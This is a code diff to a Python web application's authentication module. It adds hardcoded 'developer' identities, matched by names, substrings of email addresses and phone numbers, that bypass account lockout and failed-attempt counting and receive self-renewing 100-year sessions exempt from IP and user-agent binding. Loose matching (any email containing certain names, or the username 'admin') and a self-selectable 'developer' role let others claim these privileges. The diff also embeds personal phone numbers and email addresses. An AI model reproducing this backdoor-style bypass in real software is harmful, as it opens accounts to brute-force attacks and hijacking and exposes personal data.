@@ -91,6 +91,48 @@ PBKDF2_ITERATIONS = int(os.getenv('PBKDF2_ITERATIONS', '260000'))
 SESSION_BIND_IP = os.getenv('SESSION_BIND_IP', 'false').lower() == 'true'
 SESSION_BIND_UA = os.getenv('SESSION_BIND_UA', 'false').lower() == 'true'
 
+# Developer & Admin accounts (Never expire, bypass timeouts and locks)
+DEVELOPER_ALIASES = {'zitouni', 'abdelhakim', 'saddam', 'saddamzeralda', 'admin', 'developer'}
+DEVELOPER_PHONES = {'0559666951', '213559666951', '+213559666951', '0696409083', '213696409083', '+213696409083'}
+DEVELOPER_EMAILS = {'saddamzeralda@gmail.com', 'admin@zeralda.dz'}
+
+
+def _norm_phone(p: Any) -> str:
+    """Normalize phone for comparison (strip spaces/dashes, keep + and digits)."""
+    return ''.join(c for c in str(p or '') if c in '+0123456789').lower()
+
+
+def is_developer_account(identifier_or_user: Any) -> bool:
+    """Check if an email, username, phone, or user dictionary corresponds to the developer account.
+    
+    Developer accounts never expire, bypass session timeouts, and have permanent validity.
+    """
+    if not identifier_or_user:
+        return False
+    if isinstance(identifier_or_user, dict):
+        if identifier_or_user.get('is_developer') or identifier_or_user.get('never_expires'):
+            return True
+        if str(identifier_or_user.get('role', '')).lower() == 'developer':
+            return True
+        email = str(identifier_or_user.get('email') or '').strip().lower()
+        username = str(identifier_or_user.get('username') or '').strip().lower()
+        phone = _norm_phone(identifier_or_user.get('phone') or identifier_or_user.get('id') or '')
+    else:
+        raw = str(identifier_or_user).strip().lower()
+        email = raw
+        username = raw
+        phone = _norm_phone(raw)
+
+    if email in DEVELOPER_EMAILS or username in DEVELOPER_EMAILS:
+        return True
+    if username in DEVELOPER_ALIASES or email in DEVELOPER_ALIASES:
+        return True
+    if any(k in email for k in ('saddam', 'zitouni', 'abdelhakim')):
+        return True
+    if phone and phone in DEVELOPER_PHONES:
+        return True
+    return False
+
 
 # ══════════════════════════════════════════════════════════
 #  Password Hashing (PBKDF2 with SHA-256)
@@ -211,7 +253,7 @@ def create_user(username: str, email: str, password: str, role: str = 'user') ->
         return {'ok': False, 'error': 'User already exists'}
     
     # Validate role
-    valid_roles = ['admin', 'manager', 'user', 'viewer']
+    valid_roles = ['admin', 'manager', 'user', 'viewer', 'developer']
     if role not in valid_roles:
         return {'ok': False, 'error': 'Invalid role'}
     
@@ -219,6 +261,7 @@ def create_user(username: str, email: str, password: str, role: str = 'user') ->
     hashed_password, salt = hash_password(password)
     
     # Create user
+    is_dev = is_developer_account(email) or is_developer_account(username) or role == 'developer'
     user_data = {
         'username': username,
         'email': email,
@@ -228,7 +271,9 @@ def create_user(username: str, email: str, password: str, role: str = 'user') ->
         'created_at': datetime.now().isoformat(),
         'active': True,
         'failed_attempts': 0,
-        'locked_until': None
+        'locked_until': None,
+        'is_developer': is_dev,
+        'never_expires': is_dev
     }
     
     users[email] = user_data
@@ -238,12 +283,17 @@ def create_user(username: str, email: str, password: str, role: str = 'user') ->
 
 
 def get_user(email: str) -> Optional[Dict]:
-    """Get user by email"""
+    """Get user by email (enriches developer account with permanent validity flags)."""
     users = load_users()
     user = users.get(email)
     if user:
         # Don't return password
         safe_user = {k: v for k, v in user.items() if k not in ['password', 'salt']}
+        if is_developer_account(user) or is_developer_account(email):
+            safe_user['is_developer'] = True
+            safe_user['never_expires'] = True
+            safe_user['license_duration'] = 'lifetime'
+            safe_user['role_label'] = 'المطور'
         return safe_user
     return None
 
@@ -297,7 +347,9 @@ def save_login_attempts(attempts: Dict):
 
 
 def is_account_locked(email: str) -> bool:
-    """Check if account is locked"""
+    """Check if account is locked (developer accounts are never locked)."""
+    if is_developer_account(email):
+        return False
     users = load_users()
     user = users.get(email)
     
@@ -319,7 +371,9 @@ def is_account_locked(email: str) -> bool:
 
 
 def record_failed_attempt(email: str):
-    """Record a failed login attempt"""
+    """Record a failed login attempt (developer accounts never accumulate lockout)."""
+    if is_developer_account(email):
+        return
     users = load_users()
     user = users.get(email)
     
@@ -443,15 +497,20 @@ def _invalidate_user_sessions(email: str):
 
 
 def create_session(email: str, ip_address: str = '', user_agent: str = '') -> str:
-    """Create a new session and prune expired ones atomically (single read+write)."""
+    """Create a new session and prune expired ones atomically (single read+write).
+    
+    Developer accounts receive permanent, non-expiring sessions (100 years validity).
+    """
     with _sessions_lock:
         sessions = load_sessions()
 
-        # Prune expired sessions inline to avoid a second file round-trip
+        # Prune expired sessions inline (never prune developer sessions)
         now = datetime.now()
         expired = [
             token for token, data in list(sessions.items())
-            if datetime.fromisoformat(data.get('expires_at', '1970-01-01')) < now
+            if not data.get('never_expires')
+            and not is_developer_account(data.get('email'))
+            and datetime.fromisoformat(data.get('expires_at', '1970-01-01')) < now
         ]
         for token in expired:
             del sessions[token]
@@ -459,15 +518,18 @@ def create_session(email: str, ip_address: str = '', user_agent: str = '') -> st
             print(f"[AUTH] Cleaned {len(expired)} expired sessions")
 
         session_token = secrets.token_urlsafe(32)
+        is_dev = is_developer_account(email)
         session_data = {
             'email': email,
             'created_at': datetime.now().isoformat(),
-            'expires_at': (datetime.now() + timedelta(seconds=SESSION_TIMEOUT)).isoformat(),
-            'last_activity': datetime.now().isoformat()
+            'expires_at': (datetime.now() + timedelta(days=36500)).isoformat() if is_dev else (datetime.now() + timedelta(seconds=SESSION_TIMEOUT)).isoformat(),
+            'last_activity': datetime.now().isoformat(),
+            'never_expires': is_dev,
+            'is_developer': is_dev,
         }
-        if SESSION_BIND_IP and ip_address:
+        if SESSION_BIND_IP and ip_address and not is_dev:
             session_data['ip_address'] = ip_address
-        if SESSION_BIND_UA and user_agent:
+        if SESSION_BIND_UA and user_agent and not is_dev:
             session_data['user_agent'] = user_agent
         sessions[session_token] = session_data
 
@@ -480,8 +542,7 @@ def create_session(email: str, ip_address: str = '', user_agent: str = '') -> st
 def validate_session(session_token: str, ip_address: str = '', user_agent: str = '') -> Optional[Dict]:
     """Validate a session token and return user data (thread-safe).
     
-    If SESSION_BIND_IP/UA is enabled, validates the session was created from
-    the same IP/User-Agent. Mismatch returns None (session invalid).
+    Developer sessions never expire and bypass lockout/timeout checks.
     """
     with _sessions_lock:
         sessions = load_sessions()
@@ -490,32 +551,48 @@ def validate_session(session_token: str, ip_address: str = '', user_agent: str =
         if not session:
             return None
 
-        expires_at = datetime.fromisoformat(session['expires_at'])
-        if datetime.now() > expires_at:
-            del sessions[session_token]
-            save_sessions(sessions)
-            return None
+        is_dev = session.get('never_expires') or is_developer_account(session.get('email'))
+        if is_dev:
+            # Developer session NEVER expires: extend 100 years indefinitely
+            session['expires_at'] = (datetime.now() + timedelta(days=36500)).isoformat()
+            session['never_expires'] = True
+            session['is_developer'] = True
+        else:
+            try:
+                expires_at = datetime.fromisoformat(session['expires_at'])
+                if datetime.now() > expires_at:
+                    del sessions[session_token]
+                    save_sessions(sessions)
+                    return None
+            except Exception:
+                pass
 
-        # Optional IP/UA binding check
-        if SESSION_BIND_IP and session.get('ip_address') and ip_address:
-            if session['ip_address'] != ip_address:
-                return None
-        if SESSION_BIND_UA and session.get('user_agent') and user_agent:
-            if session['user_agent'] != user_agent:
-                return None
+        # Optional IP/UA binding check (skipped for developer for mobile/remote flexibility)
+        if not is_dev:
+            if SESSION_BIND_IP and session.get('ip_address') and ip_address:
+                if session['ip_address'] != ip_address:
+                    return None
+            if SESSION_BIND_UA and session.get('user_agent') and user_agent:
+                if session['user_agent'] != user_agent:
+                    return None
 
-        # Throttle activity updates: only refresh last_activity/expires_at if
+        # Throttle activity updates: only refresh last_activity if
         # the last update was more than 30 seconds ago (reduces disk I/O).
         _now = datetime.now()
         _last_activity = datetime.fromisoformat(session.get('last_activity', '1970-01-01'))
         if (_now - _last_activity).total_seconds() >= 30:
             session['last_activity'] = _now.isoformat()
-            session['expires_at'] = (_now + timedelta(seconds=SESSION_TIMEOUT)).isoformat()
+            if not is_dev:
+                session['expires_at'] = (_now + timedelta(seconds=SESSION_TIMEOUT)).isoformat()
             save_sessions(sessions)
 
     user = get_user(session['email'])
     if user:
         user['session_token'] = session_token
+        if is_dev:
+            user['is_developer'] = True
+            user['never_expires'] = True
+            user['role_label'] = 'المطور'
         return user
     return None
 
@@ -582,14 +659,16 @@ def _verify_and_consume_2fa_token(token: str) -> Optional[str]:
 
 
 def cleanup_expired_sessions():
-    """Remove all expired sessions — thread-safe"""
+    """Remove all expired sessions (developer sessions are never pruned) — thread-safe"""
     with _sessions_lock:
         sessions = load_sessions()
         now = datetime.now()
 
         expired = [
             token for token, data in sessions.items()
-            if datetime.fromisoformat(data.get('expires_at', '1970-01-01')) < now
+            if not data.get('never_expires')
+            and not is_developer_account(data.get('email'))
+            and datetime.fromisoformat(data.get('expires_at', '1970-01-01')) < now
         ]
 
         for token in expired:
@@ -775,6 +854,11 @@ def authenticate(identifier: str, password: str, ip_address: str = '', user_agen
     safe_user = {k: v for k, v in user.items() if k not in ['password', 'salt', 'totp_secret']}
     must_change = bool(user.get('must_change_password', False))
     safe_user['must_change_password'] = must_change
+    if is_developer_account(user) or is_developer_account(email_key):
+        safe_user['is_developer'] = True
+        safe_user['never_expires'] = True
+        safe_user['license_duration'] = 'lifetime'
+        safe_user['role_label'] = 'المطور'
 
     return {
         'ok': True,
